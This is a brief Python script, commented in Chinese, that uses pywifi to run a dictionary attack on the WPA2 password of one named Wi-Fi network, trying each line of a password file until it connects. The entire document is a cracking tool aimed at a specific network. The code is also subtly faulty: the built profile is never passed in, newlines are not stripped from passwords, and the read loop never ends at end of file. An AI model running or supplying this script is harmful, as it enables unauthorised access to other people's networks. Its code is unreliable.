
import pywifi
import time
from pywifi import const

# 导入模块
# 抓取网卡接口
# 断开所有的WiFi
# 读取密码本
# 设置睡眠时间
# 测试连接

def wificonnect(pwd):
    """测试连接"""
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    iface = wifi.interfaces()[0]
    # 断开所有的连接
    iface.disconnect()
    time.sleep(1)
    wifistatus = iface.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # print("未连接")
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接Wifi的名称
        profile.ssid = "Vivint5A268"
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # WiFi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = pwd
        # 删除所有的WiFi文件
        iface.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = iface.add_network_profile()
        iface.connect(tep_profile)
        # WiFi连接时间
        time.sleep(4)
        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已连接")


def readPassword():
    """读取密码本"""
    print("开始破解：")
    # 读取密码本的路径
    path = "pass.txt"
    # 打开文件
    with open(path, "r") as f:
        while True:
            try:
                passStr = f.readline()
                bool = wificonnect(passStr)
                if bool:
                    print("密码正确", passStr)
                    break
                else:
                    print("密码不正确", passStr)
            except:
                continue

readPassword()